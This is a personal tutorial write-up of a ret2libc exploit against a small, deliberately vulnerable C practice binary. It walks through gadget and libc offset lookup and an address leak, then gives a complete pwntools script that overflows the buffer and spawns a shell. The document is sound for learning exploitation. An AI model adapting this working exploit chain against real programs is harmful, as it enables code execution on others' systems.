# Another awsome breakdown provided by @legacyy.  I was able to perform my first ret2libc thanks to him.
https://www.legacyy.xyz/  
https://twitter.com/0xLegacyy  

The source code of ret2libc

```c
#include <stdio.h>


int main(int argc, char **argv)
{
    char buf[64]; 
	/* buf variable takes 64 bytes of data */

    puts("Welcome! This is a ret2libc ooooooooo spooky");

    read(0, buf, 1024);
	/* read function takes reads user_input of buf. */

    return 0;
}
```

### Reviewing the list of functions using gdb debugger by typing `info func`.

```
gdb-peda$ info func
All defined functions:

Non-debugging symbols:
0x0000000000401000  _init
0x0000000000401050  puts@plt
0x0000000000401060  read@plt
0x0000000000401070  _start
0x00000000004010a0  _dl_relocate_static_pie
0x00000000004010b0  deregister_tm_clones
0x00000000004010e0  register_tm_clones
0x0000000000401120  __do_global_dtors_aux
0x0000000000401150  frame_dummy
0x0000000000401156  main
0x00000000004011a0  __libc_csu_init
0x0000000000401210  __libc_csu_fini
0x0000000000401218  _fini
```

### I will need find the initial offset for the read function from the global offset table. I can find this inside `.got.plt` in ghidra.

```
read function => 0x404020
```

### Using ROPGadget to retrieve offset of pop_rdi gadget:

```
root@kali:~/recon/ret2lib# ROPgadget --binary=./ret2libc | grep rdi
0x00000000004010c6 : or dword ptr [rdi + 0x404038], edi ; jmp rax
0x0000000000401203 : pop rdi ; ret

pop_rdi => 0x401203
```

### retrieving your read, system and bin_sh offsets from your libc library (x64)

```
I will need to now retrieve my libc offsets using a useful tool named libc-database from github:

git clone https://github.com/niklasb/libc-database.git
cd libc-database
./add /usr/lib/x86_64-linux-gnu/libc.so.6
./identify /usr/lib/x86_64-linux-gnu/libc.so.6 # Will output local-XXXXXXXXXXXXXXXXX
./dump local-e01df0b7efc9be9a5af9b3c6c66da3d1b853aa88 read system str_bin_sh

1. ./add /usr/lib/x86_64-linux-gnu/libc.so.6
Adding local libc /usr/lib/x86_64-linux-gnu/libc-2.31.so (id local-e01df0b7efc9be9a5af9b3c6c66da3d1b853aa88  /usr/lib/x86_64-linux-gnu/libc-2.31.so)
  -> Writing libc /usr/lib/x86_64-linux-gnu/libc-2.31.so to db/local-e01df0b7efc9be9a5af9b3c6c66da3d1b853aa88.so
  -> Writing symbols to db/local-e01df0b7efc9be9a5af9b3c6c66da3d1b853aa88.symbols
  -> Writing version info

2. ./identify /usr/lib/x86_64-linux-gnu/libc.so.6
local-e01df0b7efc9be9a5af9b3c6c66da3d1b853aa88

3. ./dump local-e01df0b7efc9be9a5af9b3c6c66da3d1b853aa88 read system str_bin_sh
offset_read = 0x00000000000eee80
offset_system = 0x0000000000048e50
offset_str_bin_sh = 0x18a152
```

### found the following libc addresses:
```
offset_read       => 0xeee80
offset_system	  => 0x48e50
offset_str_bin_sh => 0x18a152
```

### To leak the libc_read address, I will need to initialize the rop chain.

```py
buf = b"A" * (64 + 8) # The overflow of 64 bytes and overwrite of rbp
buf += p64(pop_rdi) + p64(read_got) # set rdi to read_got
buf += p64(puts_ptr) # puts read_got to screen
buf += p64(main_ptr) # return to main
```

### sending the buf payload to the binary by typing `p.sendline(buf)`

### Cleaning up the leaked address

`leaked_libc_read = u64(p.recvuntil(b"\n")[:-1].ljust(8, b"\x00"))`

- To properly clean the leaked address you must first retrieve it by typing `p.recvuntil(b"\n")`. Then to remove the newline at the end of the address by typing `[:-1]`.
- Then you will need to pad the address to equal 8 bytes to the left, this can be done by using `ljust`. `p.recvuntil(b"\n")[:-1].ljust(8, b"\x00")`
- After padding the address you can unpack the address by using `u64`.

Once cleaned the leaked_libc_read should look like `0x7fe39de9be80`

### Finding your libc_base address

To find your libc_base address you can minus `libc_read` by `leaked_libc_read`.

`libc_base = leaked_libc_read - libc_read`

### Proceeding with adding `libc_system` to `libc_base` and `libc_bin_sh` to `libc_base` to get your system/bin_sh pointer.

`system_ptr = libc_base + system_libc`

`bin_sh_ptr = libc_base + libc_bin_sh`

### Now that you have the necessary functions to call a system shell, create a new rop chain and call system to get your shell. *Reminder* You will need to ensure the rop chain equals to the multiple of 16 so the chain we are executing was not originally a multiple of 16.  To resolve this, we had found a ret; gadget to make it 32 bytes which makes it a multiple of 16 `32 / 16 = 2`.

```py
buf = b"A" * (64 + 8) # once again, adding our overflow and overwrite of rbp
buf += p64(pop_rdi) + p64(bin_sh_ptr) # rip pops rdi as "/bin/sh" pointer
buf += p64(system_ptr) # and system function pointer called "/bin/sh".
buf += p64(ret_gt) # in order for the rop chain to properly execute, another address of 8 bytes is needed to make this a multiple of 16. A simple ret; gadget should work fine.
buf += p64(main_ptr) # returns back to main.
```

### Next, send the new rop chain payload to the binary and execute your system shell.

```bash
python3 ret2libc.py 
[+] Starting local process './ret2libc': pid 5862
Leaked libc => 0x7fdbf2255e80
libc base => 0x7fdbf2167000
system pointer => 0x7fdbf21afe50
bin_sh pointer => 0x7fdbf22f1152

[*] Switching to interactive mode
$ whoami
root

```

### My exploit script

```py
from pwn import *

p = process("./ret2libc")

main_ptr = 0x401156 # offset for main().
puts_ptr = 0x401050 # offset for puts().
pop_rdi = 0x401203 # offset for pop rdi; ret;
read_got = 0x404020 # offset for read() in the global offset table
ret_gt = 0x40101a # ret gadget

libc_read = 0xeee80 # libc read function offset from libc.so.6
system_libc = 0x48e50 # libc system function offset from libc.so.6
libc_bin_sh = 0x18a152 # libc /bin/sh string offset from libc.so.6

#Receive initial text
p.recvline()

# ROP Chain #1
buf = b"A" * (64 + 8) # The overflow of 64 bytes and overwrite of rbp
buf += p64(pop_rdi) + p64(read_got) # set rdi to read_got
buf += p64(puts_ptr) # puts read_got to screen
buf += p64(main_ptr) # return to main

# send ROP chain
p.sendline(buf)

# receive line until a new line and retrieve the leaked libc address.  ljust by adding padding nullbytes until its 8 bytes long then unpack the address so that the address.
leaked_libc_read = u64(p.recvuntil(b"\n")[:-1].ljust(8, b"\x00"))

# Successfully retrieved leaked libc
print(f"Leaked libc => {hex(leaked_libc_read)}")

# Retrieve data
p.recvline()

# Getting the libc base address by minus leaked libc offset against libc_read
libc_base = leaked_libc_read - libc_read
# Getting system pointer by adding system_libc to libc_base
system_ptr = libc_base + system_libc
# Getting /bin/sh pointer by adding libc_bin_sh to libc_base
bin_sh_ptr = libc_base + libc_bin_sh

print(f"libc base => {hex(libc_base)}")
print(f"system pointer => {hex(system_ptr)}")
print(f"bin_sh pointer => {hex(bin_sh_ptr)}")
print()

buf = b"A" * (64 + 8) # once again, adding our overflow and overwrite of rbp
buf += p64(pop_rdi) + p64(bin_sh_ptr) # rip pops rdi as "/bin/sh" pointer
buf += p64(system_ptr) # and system function pointer called "/bin/sh".
buf += p64(ret_gt) # in order for the rop chain to properly execute, another address of 8 bytes is needed to make this a multiple of 16. A simple ret; gadget should work fine.
buf += p64(main_ptr) # returns back to main.

# send new rop chain
p.sendline(buf)
p.interactive()
```
